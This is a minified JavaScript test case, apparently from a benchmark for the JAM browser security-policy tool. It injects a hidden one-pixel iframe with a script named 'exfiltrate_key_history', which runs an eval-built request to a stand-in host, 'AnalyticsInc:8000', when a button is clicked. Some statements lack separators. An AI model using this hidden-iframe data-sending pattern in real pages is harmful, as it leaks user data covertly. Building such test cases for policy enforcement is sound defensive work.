function runTest() {

  JAM.startProfile('load');
  function click_inner(){var event=new Event("click");document.getElementById("test2").dispatchEvent(event)}var v1=document.head.childNodes;introspect(JAM.policy.p1)var pol=v1[5];var v2=document.head.childNodes;introspect(JAM.policy.p1)var tx=v2[7];var button=document.getElementById("test"),button2=button.cloneNode(!0);button2.id="test2";var script=document.createElement("script");JAM.set(script,"textContent","function exfiltrate_key_history() {var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\", \"http://AnalyticsInc:8000/submission.html?test=iframe\", true);xmlhttp.send(null);';eval(exp);}document.getElementById('test2').onclick = exfiltrate_key_history;");
  var frm=document.createElement("iframe");JAM.call(frm.setAttribute,frm,["id","ifrm"]);JAM.call(frm.setAttribute,frm,["src","JavaScript:''"]);frm.style.width="1px";frm.style.height="1px";JAM.call(frm.appendChild,frm,[tx]);JAM.call(frm.appendChild,frm,[button2]);JAM.call(frm.appendChild,frm,[script]);var v5=document.body;JAM.call(v5.appendChild,v5,[frm]);JAM.set(document.getElementById("test"),"onclick",click_inner)

  JAM.stopProfile('load');

  return "RESULT NOT SPECIFIED";
}
